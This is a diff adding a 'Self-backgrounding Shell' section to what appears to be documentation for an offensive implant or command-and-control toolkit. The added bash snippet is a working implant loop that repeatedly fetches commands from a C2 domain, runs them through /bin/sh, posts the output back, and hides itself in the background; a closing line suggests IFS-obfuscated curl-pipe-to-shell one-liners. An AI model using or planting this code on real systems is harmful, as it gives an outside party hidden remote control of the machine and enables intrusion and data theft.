@@ -28,6 +28,24 @@ ID="$RANDOM" while :; do
 done
 ```
 
+Self-backgrounding Shell
+========================
+```bash
+ID="$RANDOM"         # Implant ID
+CBINT=5              # Callback Interval, seconds
+DOMAIN="example.com" # C2 domain
+
+bash -c "while :; do
+    curl -s 'https://$DOMAIN/t/$ID' |
+    /bin/sh |
+    curl --data-binary @- -s 'https://$DOMAIN/o/$ID'
+    sleep '$CBINT'
+done" >/dev/null 2>&1 </dev/null &
+```
+
+This is a good one to leave in `plonk.d/files` for quick and dirty
+`curl${IFS}DOMAIN/f/x|sh`ish commands.
+
 Perl
 ----
 ```perl
